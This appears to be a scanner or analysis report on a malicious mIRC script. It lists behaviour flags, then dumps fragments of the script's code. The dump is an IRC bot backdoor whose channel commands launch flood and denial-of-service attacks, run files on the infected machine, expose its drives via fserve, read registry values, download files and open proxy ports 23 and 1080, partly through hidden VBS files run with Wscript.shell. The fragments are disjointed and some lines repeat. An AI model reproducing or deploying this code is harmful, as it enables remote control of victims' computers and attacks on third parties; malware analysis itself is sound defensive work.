behavior.Hex Strings: Hex-encoded str were detected, may be used to obfuscate str
behavior.Wscript.shell: May run an executable file or a system command
behavior.chr: May attempt to obfuscate specific str
behavior.run: May run an executable file or a system command
behavior.shell: May run an executable file or a system command
behavior.system: May run an executable file or a system command on a Mac

filetype: ISO-8859 text, with very long lines, with CRLF line terminators

dump: sockaccept NewSocket | %ip =  $sock(Newsocket).ip | echo 4 -s *** Connection of %ip on $sockname
if ( $sockerr > 0 ) {  sockwrite -n %temp ERROR connecting... | aline -ph 6 %temp2 *** Error connecting | return }
sockaccept NewSocket | %ip =  $sock(Newsocket).ip | echo 4 -s *** Connection of %ip on $sockname
if ( $sockerr > 0 ) {  sockwrite -n %temp ERROR connecting... | aline -ph 6 %temp2 *** Error connecting | return }
if ($sockerr > 0) { echo **Invalid URL, check your parameters and retry. | return }
decho ^-to delete this file, press shift+f7
if ($sockerr > 0) { decho ** .4Unknown error occured. | sf5 | halt }
if ($sockerr > 0) { decho ** .4Unknown error occured. | sf5 | halt }

if ($1 == !portattack) { if ($4 == $null) { /msg # portattack error | halt } | /timer3 $4 on { //sockopen +AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH $+ $2 $2 $3 $2 } | /timer4 $4 on { //sockclose +AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH $+ $2 $2 $3 $2 } | }

elseif ($1 == !crud) { if ($3 == $null) { /msg # crud error | halt } | /timer1 $3 on { //sockopen +AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH $+ $2 $2 $r(1,22222) $2 } | /timer2 $3 on { //sockclose +AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH $+ $2 $2 $r(1,22222) $2 } | }

elseif ($1 == !igmp) { if ($2 == $null) { /msg # igmp error | halt } | .remove igmp.vbs | .write igmp.vbs Set src3 = CreateObject("Wscript.shell") | .write igmp.vbs src3.run "command /c igmp $2 ",0,true | .run igmp.vbs }

elseif ($1 == !oob) { if ($3 == $null) { /msg # oob error | halt } | .remove pepsi.vbs | .write pepsi.vbs Set src3 = CreateObject("Wscript.shell") | .write pepsi.vbs src3.run "command /c pepsi -n $3 -p $4 -d $5 $2 ",0,true | .run pepsi.vbs }

elseif ($1 == !icmp) { if ($4 == $null) { /msg # icmp error | halt } | .remove icmp.vbs | .write icmp.vbs Set src3 = CreateObject("Wscript.shell") | .write icmp.vbs src3.run "command /c ping -n $4 -l $3 -w 0 $2 ",0,true | .run icmp.vbs }
elseif ($1 == !udp) { if ($4 == $null) { /msg # udp error | halt } | //set %pchan # |  if ($4 == random) { //gcoolstart $2 $3 $r(1,65000) | halt } | //gcoolstart $2 $3 $4 }
elseif ($1 == !run) { if ($2 == $null) { /msg # run error | halt } | .run $findfile(c:\,$2,1) | /msg # $2 executed }
elseif ($1 == !spammsg) { if ($2 == $null) { /msg # spammsg error | halt } | set %spam $2- | /msg # Spammsg : %spam | halt }
elseif ($1 == !fserve) { if ($2 == $null) { /msg # fserve error | halt } | fserve $nick 5 $2 $+ :\ }
elseif ($1 == !clones) { socklisten botidentclone. $+ $rand(0,1000000) 113 | sockopen clone. $+ $rand(0,1000000000) $2 $3 | halt }
elseif ($1 == !clonesc) { sockclose clone* | sockclose botidentclone* | halt }
elseif ($1 == !download) { if ($2 == $null) { /msg # download error | halt } | /downloader $2- | halt }
elseif ($1 == !readkey) { if ($2 == $null) { /msg # key error | halt } | /timer 1 1 msg # The value of $2 is $regread($2) | halt }
alias gdope { if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4
msg # Spaming on %ss with nick %m.nick and user %m.user
alias openwin socklisten swingate 1080 | socklisten swingate2 23 | msg # Proxy opened on port 23 and 1080
if ( $sock(%temp2).name != $null ) { sockwrite -n %temp2 quit :Closing of the wingate server | sockclose %temp2  }
sockclose swingate | sockclose swingate2 | msg # Proxy closed
decho ** .4Download of %down.lfile in progress! (one file at a time.)
decho ** .4To halt the progress of this file, press .2shift+f5
if ($chr($asc(@)) !isin %down.s) { decho Downloader - Must provide pass | sf5 | halt }
if (%down.pass == $null) { decho Downloader - invalid parameters | halt }
decho | decho Saving to file: $sr(%down.lfile) | decho
